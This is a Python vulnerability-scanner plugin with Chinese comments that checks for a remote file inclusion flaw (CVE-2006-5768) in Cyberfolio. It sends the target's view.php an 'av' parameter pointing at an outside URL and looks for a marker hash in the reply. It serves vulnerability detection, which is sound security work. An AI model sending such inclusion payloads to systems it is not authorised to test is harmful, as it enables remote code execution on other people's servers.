# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Cyberfolio_0000'  # 平台漏洞编
    # 漏洞名称
    name = 'Cyberfolio <= 2.0 RC1 (av) Remote File Include Vulnerabilities'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        Cyberfolio中存在多个PHP远程文件包含漏洞，当系统启用register_globals时，远程攻击者可以通过传递给(1)msg/view.php，(2)msg/inc_message.php，(3)msg/inc_envoi.php和(4)admin/incl_voir_compet.php的av参数内的URL来执行任意PHP代码。
        Cyberfolio 2.0及其以下版本远程文件包含漏洞。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-8325'  # 漏洞来源
    cnvd_id = 'CNVD-2006-8325'  # cnvd漏洞编号
    cve_id = 'CVE-2006-5768'  # cve编号
    product = 'Cyberfolio'  # 漏洞组件名称
    product_version = '<= 2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cafbaae0-dda5-4b8f-a917-b666f43dddc1'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/portfolio/msg/view.php?av=http://www.sqlsec.com/admin.html'
            response = requests.get(vul_url).text
            if re.search('765635a65f5919b89a990aaf0cb168d7', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
